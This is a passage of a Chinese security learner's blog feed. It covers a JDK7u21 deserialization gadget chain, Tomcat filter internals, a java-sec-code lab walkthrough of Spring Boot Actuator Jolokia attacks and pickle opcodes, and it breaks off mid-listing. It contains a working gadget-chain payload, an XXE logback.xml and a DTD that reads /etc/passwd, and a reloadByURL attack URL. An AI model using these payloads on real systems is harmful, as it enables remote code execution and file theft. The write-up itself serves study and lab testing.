class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">memberValueHashCode</span><span class="token punctuation">(</span>var3<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        var3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> var1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hashCode=每一个键值对的(String)key与value的hashCode进行异或并*127的和</p><p><del>然后hashMap中entry的hashcode是key和value进行异或</del></p><p>总之就是这俩hash只要保证代理的map里面的value为外面的TemplatesImpl，就能保证hash的值相等（nnd我怎么知道为什么）</p><p>相等后调用equals，通过invoke调用传入内容的所有方法，结束！</p>        <h3 id="payload"   >          <a href="#payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload" class="headerlink" title="payload"></a>payload</h3>      <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">Object</span> templates <span class="token operator">=</span> <span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> zeroHashCodeStr <span class="token operator">=</span> <span class="token string">"f5a5a608"</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>zeroHashCodeStr<span class="token punctuation">,</span> <span class="token string">"fnjjnljkoo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InvocationHandler</span> tempHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">getFirstCtor</span><span class="token punctuation">(</span><span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token constant">ANN_INV_HANDLER_CLASS</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>tempHandler<span class="token punctuation">,</span> <span class="token string">"type"</span><span class="token punctuation">,</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Templates</span> proxy <span class="token operator">=</span> <span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token function">createProxy</span><span class="token punctuation">(</span>tempHandler<span class="token punctuation">,</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LinkedHashSet</span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// maintain order</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//恶意对象</span>      set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>proxy<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_auxClasses"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//满足TemplatesImpl要求</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>zeroHashCodeStr<span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// swap in real object</span><span class="token keyword">return</span> set<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="关键点"   >          <a href="#关键点" class="heading-link"><i class="fas fa-link"></i></a><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3>      <p>首先就是AnnotationInvocationHandler这个代理类对equals的重写，当没有办法通过简单信息判断两者是否相等时，就通过get方法逐步取出所有可能能访问的访问的属性进行依次比较，并且在二者类无关时直接放弃比较</p><p>其次是对hashCode的了解，hashCode并不是万能的，有的时候hashCode也不能准确的区分两个内容（比如说hash为0的字符串），还有map中每个entry的hashcode都是键值对的hashcode进行异或</p><p>链子越跟越顺，很多情况下卡住要么是因为不知道代码这么做要干啥，要么是对部分功能的底层实现不熟悉，还是要多看代码～</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring反序列化链</title>
      <link href="/posts/78b72c5e.html"/>
      <url>/posts/78b72c5e.html</url>
      
        <content type="html"><![CDATA[<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓逆向入门</title>
      <link href="/posts/6680e10d.html"/>
      <url>/posts/6680e10d.html</url>
      
        <content type="html"><![CDATA[<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">                ApplicationFilterConfig filterConfig &#x3D;                        new ApplicationFilterConfig(this, entry.getValue());&#x2F;&#x2F;这里的value是一个filterDef，这么看来config是在初始化的时候动态生成的                filterConfigs.put(name, filterConfig);&#x2F;&#x2F;将filter放入filterConfigs中这两句后面应该用的上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">                fireLifecycleEvent(Lifecycle.CONFIGURE_START_EVENT, null);        for (FilterMap filterMap : webxml.getFilterMappings()) &#123;            context.addFilterMap(filterMap);        &#125;        通过一个for循环把注解和web.xml里面的数据都拿出来从这里开始加的filtermapfilterMaps.add(filterMap);最后就这一句nnd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301181724518.png"></p><p>filtermap要长成这样</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301181728936.png"></p><pre class="line-numbers language-none"><code class="language-none">public void addFilterMap(FilterMap filterMap) &#123;    validateFilterMap(filterMap);    &#x2F;&#x2F; Add this filter mapping to our registered set    filterMaps.add(filterMap);    fireContainerEvent(&quot;addFilterMap&quot;, filterMap);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>日报 Personal ver.</title>
      <link href="/posts/f35ad716.html"/>
      <url>/posts/f35ad716.html</url>
      
        <content type="html"><![CDATA[<p>不定期更新日报</p><p>这个站快停更了，最近学的东西都不在这里（）</p><p>20230111</p><ol><li>具体了解完了Java静态代理和动态代理的区别，看到了动态代理的好处</li><li>FastJson具体执行流程又跟一遍（果然几天不看就会忘掉）</li><li>看了一些javascript的正则包的奇怪芝士</li><li>看了点java开发的一些基础知识</li></ol><p>20230206</p><p>目前在写的内容有</p><p><del>TemplatesImpl在反序列化链中的作用</del></p><p>JDK7u21反序列化分析</p><p>安卓逆向入门</p><p>在更新了。。。。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022年终</title>
      <link href="/posts/d8189907.html"/>
      <url>/posts/d8189907.html</url>
      
        <content type="html"><![CDATA[<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java-sec-code环境测试指北</title>
      <link href="/posts/3ce7c20f.html"/>
      <url>/posts/3ce7c20f.html</url>
      
        <content type="html"><![CDATA[<p>好棒的测试环境，几乎涵盖所有类型的java漏洞了，首先要感谢一下JoyChou师傅的环境：<span class="exturl"><a class="exturl__link"   href="https://github.com/JoyChou93/java-sec-code" >https://github.com/JoyChou93/java-sec-code</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>让我们一个个看过去</p>        <h2 id="Actuators-to-RCE"   >          <a href="#Actuators-to-RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#Actuators-to-RCE" class="headerlink" title="Actuators to RCE"></a>Actuators to RCE</h2>      <p>首先我们要了解一下Spring Boot Actuator是什么</p><blockquote><p>Spring Boot Actuator是Spring Boot提供用于对应用系统进行自省和监控的功能模块，基于此开发人员可以方便地对应用系统某些监控指标进行查看、统计、审计、指标收集等。 Actuator提供了基于Http端点或JMX来管理和监视应用程序</p></blockquote><p>说白了就是一个针对于Spring Boot的管理程序，可以直接通过http管理监视SpringBoot应用程序</p><p><strong>JMX和Mbeans</strong></p><blockquote><p>JMX的全称为Java Management Extensions. 顾名思义，是管理Java的一种扩展。这种机制可以方便的管理、监控正在运行中的Java程序。常用于管理线程，内存，日志Level，服务重启，系统环境等。</p><p>MBean：是Managed Bean的简称，可以翻译为“管理构件”。在JMX中MBean代表一个被管理的资源实例，通过MBean中暴露的方法和属性，外界可以获取被管理的资源的状态和操纵MBean的行为。</p></blockquote><p>通俗来讲Spring Boot Actuator就是JMX的一种具体实现，而MBean就类似于每个功能或对每种信息进行操作或观察的一个实例</p><p>那么RCE是怎么实现的呢，我们首先看下第一种方式</p><ol><li><p><strong>jolokia</strong></p><p>Jolokia是一款开源产品，用于为JMX（Java Management Extensions）技术提供HTTP API接口</p><p>漏洞成因：logback JMXConfigurator 允许通过 JMX 来配置 logback。简单来说就是，它允许你从默认配置文件，指定的文件或者 URL 重新配置 logback，列出 logger 以及修改 logger 级别。jolokia在logback JMXConfigurator中提供的<code>reloadByURL</code>方法允许我们从外部URL重新加载日志的记录配置。 </p><p>简单来说，就是因为Spring Boot Actuator配置不当并且其使用了Jolokia为其JMX服务提供http服务导致MBean泄露并且可以无身份认证直接通过Jolokia调用到JMX中声明好的方法</p><p>如果我们的程序调用了jolokia库，那么Spring Boot会自动注册<code>/jolokia</code>路由，Jolokia允许HTTP访问所有注册的MBean，并旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012212445.png"></p><p>出问题的点在哪里呢，是Logback库提供的“<strong>reloadByURL</strong>”操作，这个操作允许我们从外部URL重新加载日志配置。它可以通过导航到以下方式触发：<span class="exturl"><a class="exturl__link"   href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!!/artsploit.com!/logback.xml" >http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!!/artsploit.com!/logback.xml</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>那么我们修改日志配置有什么用呢？首先是这个配置文件使用的是xml格式，所以很明显我们可以通过XXE来实现任意文件读取，其次，对于Logback来说，它可以通过JNDI来获得相关变量，所以我们可以写入一个类似于 <code>&lt;insertFromJNDI env-entry-name=&quot;java:comp/env/appName&quot; as=&quot;appName&quot; /&gt;</code>的标签来实现JNDI注入进而RCE</p><p>首先来看XXE，构造两个文件</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">#logback.xml<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/file.dtd">%remote;%int;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&trick;">&amp;trick;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd"># file.dtd&lt;!ENTITY % d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#39;:%d;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后我们构造如下url<code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8000!/logback.xml</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012321677.png"></p><p>访问就有回显</p><p><del>这里往下都是没用的分析内容，不过实在是不想白白删掉了</del></p><p>我们来分析一下url构成</p><p>首先是jolokia的路径注册</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">JolokiaMvcEndpoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"jolokia"</span><span class="token punctuation">,</span> <span class="token string">"/jolokia"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>controller<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span><span class="token class-name">AgentServlet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>controller<span class="token punctuation">.</span><span class="token function">setServletName</span><span class="token punctuation">(</span><span class="token string">"jolokia"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要/jolokia开头就能进入其逻辑中，我们在来看其中对路径进行处理的内容<code>org.jolokia.http.HttpRequestHandler#handleGetRequest</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">JSONAware</span> <span class="token function">handleGetRequest</span><span class="token punctuation">(</span><span class="token class-name">String</span> pUri<span class="token punctuation">,</span> <span class="token class-name">String</span> pPathInfo<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> pParameterMap<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> pathInfo <span class="token operator">=</span> <span class="token function">extractPathInfo</span><span class="token punctuation">(</span>pUri<span class="token punctuation">,</span> pPathInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">JmxRequest</span> jmxReq <span class="token operator">=</span>            <span class="token class-name">JmxRequestFactory</span><span class="token punctuation">.</span><span class="token function">createGetRequest</span><span class="token punctuation">(</span>pathInfo<span class="token punctuation">,</span><span class="token function">getProcessingParameter</span><span class="token punctuation">(</span>pParameterMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>backendManager<span class="token punctuation">.</span><span class="token function">isDebug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        logHandler<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"URI: "</span> <span class="token operator">+</span> pUri<span class="token punctuation">)</span><span class="token punctuation">;</span>        logHandler<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Path-Info: "</span> <span class="token operator">+</span> pathInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>        logHandler<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Request: "</span> <span class="token operator">+</span> jmxReq<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">executeRequest</span><span class="token punctuation">(</span>jmxReq<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们会创建exec对应的<code>org.jolokia.request.JmxExecRequest</code>类对象，并将内容放入executeRequest中执行</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012353787.png"></p><p>可以看到已经将我们的URL进行解析了，最终其执行过程为将 JmxExecRequst 中的 operation 做参数类型鉴定，然后根据目标函数需要的参数类型，将 arguments 转换成对应类型，最后执行 server.invoke 的调用，这个调用就是执行我们指定的类中的指定的函数，那这里是不是能够任意类和任意函数都能执行呢，不是的，需要提前注册，注册的内容可以通过 <code>/jolokia/list</code> 查看，这也是我们要通过list查看是否有reloadByURL的原因，下一步我们就是来看reloadByURL函数</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012356546.png"></p><p>可以看到这个函数要求传入的参数是URL格式，不过我们上一步解析过程中已经自动将string类型转换为了URL类型，我们直接跟入<code>doConfigure</code>函数</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012358782.png"></p><p>可以看到其从url中获取流后进入下一个<code>doConfigure</code>函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">doConfigure</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">JoranException</span> <span class="token punctuation">&#123;</span>    <span class="token function">doConfigure</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>转换了下类型，继续</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301020001618.png"></p><p>这里在recordEvents中对xml内容进行了解析，触发XXE</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301020001231.png"></p><p><del>好了可以从这里开始看了</del></p><p>那么RCE的内容在哪，就是我们之前说的jolokia会从JNDI中获取变量</p><p><img src="https://www.hacking8.com/books/bug-product/Spring-Boot/376/media/rId41.png" alt="https://www.hacking8.com/books/bug-product/Spring-Boot/376/media/rId41.png"></p><p>‘</p></li></ol><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pickle源码详解</title>
      <link href="/posts/edc349ec.html"/>
      <url>/posts/edc349ec.html</url>
      
        <content type="html"><![CDATA[<p>首先很重要的就是字节码，其实pickle经过了多次迭代已经加了很多内容了，我们直接到源码里去看看</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span><span class="token comment"># here is in kind-of alphabetical order of 1-character pickle code.</span><span class="token comment"># pickletools groups them by purpose.</span><span class="token comment"># Pickle的opcodes，可在pickletools.py中查看大范围的文档，在此处列出的内容是按字母顺序排列的单字符pickle code</span><span class="token comment"># 在pickleltools中将这些内容按功能分组了</span><span class="token comment"># 等会再去pickletools里看</span><span class="token comment"># 部分偷的自己师傅的（自己人不算偷）</span>MARK           <span class="token operator">=</span> <span class="token string">b'('</span>   <span class="token comment">#向栈中压入一个Mark标记</span>STOP           <span class="token operator">=</span> <span class="token string">b'.'</span>   <span class="token comment">#相当于停止当前的反序列化过程</span>POP            <span class="token operator">=</span> <span class="token string">b'0'</span>   <span class="token comment">#从栈中pop出一个元素，就是删除栈顶元素</span>POP_MARK       <span class="token operator">=</span> <span class="token string">b'1'</span>   <span class="token comment">#从栈中不断pop元素直到遇到Mark标记</span>DUP            <span class="token operator">=</span> <span class="token string">b'2'</span>   <span class="token comment">#向栈中再压入一个当前的栈顶元素，就是复制一份当前栈顶元素然后进行压栈</span>FLOAT          <span class="token operator">=</span> <span class="token string">b'F'</span>   <span class="token comment">#读取当前行到行末尾,然后转为float类型,向栈中压入一个float浮点数</span>INT            <span class="token operator">=</span> <span class="token string">b'I'</span>   <span class="token comment">#向栈中压入一个int整数,整数就是当前行的最后一个字节,不过如果整数为01的时候压入的是True,为00的时候压入的是False</span>BININT         <span class="token operator">=</span> <span class="token string">b'J'</span>   <span class="token comment">#从后面的输入中读取4个字节并且使用unpack通过'&lt;i'的格式将4字节的buffer数据解包转为int类型,后面不能换行,直接家下一步的操作b"(S'a'\nK\x01\x01\x01\x01."</span>BININT1        <span class="token operator">=</span> <span class="token string">b'K'</span>   <span class="token comment">#和上面BININT一样,不过K操作只读取一个字节的数据b"(S'a'\nK\x01."</span>LONG           <span class="token operator">=</span> <span class="token string">b'L'</span>   <span class="token comment">#读取当前行到行末尾,然后转为int类型,但如果后面是字符L的话会先去掉最后一个字符L再转int</span>BININT2        <span class="token operator">=</span> <span class="token string">b'M'</span>   <span class="token comment">#从后面的输入中读取2个字节并且使用unpack通过'&lt;H'的格式将2字节的buffer作为一个2进制数解包为int,后面不能换行,直接加下一步的操作b"(S'a'\nM\x01\x01."</span>NONE           <span class="token operator">=</span> <span class="token string">b'N'</span>   <span class="token comment">#向栈中压入一个None元素,后面不能换行,直接加下一步的操作b"(S'a'\nN."</span>PERSID         <span class="token operator">=</span> <span class="token string">b'P'</span>   <span class="token comment">#读取当前行到行末尾,将读取到的数据作为id,通过persistent_load函数获得obj对象返回后将obj对象压栈,默认情况没用,要重写persistent_load函数才能生效</span>BINPERSID      <span class="token operator">=</span> <span class="token string">b'Q'</span>   <span class="token comment">#和上面作用一样,从当前栈中弹出一个元素作为id,通过persistent_load...</span>REDUCE         <span class="token operator">=</span> <span class="token string">b'R'</span>   <span class="token comment">#从当前栈中弹出两次元素,第一次是函数参数args,第二次是函数func,执行func(args)</span>STRING         <span class="token operator">=</span> <span class="token string">b'S'</span>   <span class="token comment">#向栈中压入一个string字符串,内容就是后面的数据,后面的字符串第一个和最后一个必须是单引号b"(S'a'\nS''a''\n."</span>BINSTRING      <span class="token operator">=</span> <span class="token string">b'T'</span>   <span class="token comment">#从后面数据读取4字节数据,通过unpack使用&lt;i格式将数据解压后变为int类型, 然后将其作为一个长度, 后面读取这个指定长度的数据作为字符串进行压栈b"(S'a'\nT\x10\x00\x00\x000123456789abcdef."</span><span class="token comment"># _struct.unpack('&lt;i', b"\x10\x00\x00\x00") => (16,)</span>SHORT_BINSTRING<span class="token operator">=</span> <span class="token string">b'U'</span>   <span class="token comment">#先读取一个字节数据作为长度,然后按照这个长度读取字符串,读出的字符串压栈</span>UNICODE        <span class="token operator">=</span> <span class="token string">b'V'</span>   <span class="token comment">#读出当前行后面的全部数据,然后进行Unicode解码,将解码内容压栈b'V\\u0061\n.'</span>BINUNICODE     <span class="token operator">=</span> <span class="token string">b'X'</span>   <span class="token comment">#读出4字节数据通过unpack使用&lt;I格式解压,将解压得到的数据作为长度,然后进行数据读取b'X\x10\x00\x00\x00abcdef0123456789.'</span>APPEND         <span class="token operator">=</span> <span class="token string">b'a'</span>   <span class="token comment">#先pop出栈一个变量var1,然后获取当前栈顶元素var2,执行栈顶元素的append函数,就是将一开始的栈顶元素弹出,然后又加到下一个栈顶数组中b"]S'h0cksr'\na." => 得到['h0cksr']</span>BUILD          <span class="token operator">=</span> <span class="token string">b'b'</span>   <span class="token comment">#这个操作就是设置元素属性的操作</span>GLOBAL         <span class="token operator">=</span> <span class="token string">b'c'</span>   <span class="token comment"># push self.find_class(modname, name); 2 string args</span>DICT           <span class="token operator">=</span> <span class="token string">b'd'</span>   <span class="token comment"># build a dict from stack items</span>EMPTY_DICT     <span class="token operator">=</span> <span class="token string">b'&#125;'</span>   <span class="token comment"># push empty dict</span>APPENDS        <span class="token operator">=</span> <span class="token string">b'e'</span>   <span class="token comment"># extend list on stack by topmost stack slice</span>GET            <span class="token operator">=</span> <span class="token string">b'g'</span>   <span class="token comment"># push item from memo on stack; index is string arg</span>BINGET         <span class="token operator">=</span> <span class="token string">b'h'</span>   <span class="token comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span>INST           <span class="token operator">=</span> <span class="token string">b'i'</span>   <span class="token comment"># build &amp; push class instance</span>LONG_BINGET    <span class="token operator">=</span> <span class="token string">b'j'</span>   <span class="token comment"># push item from memo on stack; index is 4-byte arg</span>LIST           <span class="token operator">=</span> <span class="token string">b'l'</span>   <span class="token comment"># build list from topmost stack items</span>EMPTY_LIST     <span class="token operator">=</span> <span class="token string">b']'</span>   <span class="token comment"># push empty list</span>OBJ            <span class="token operator">=</span> <span 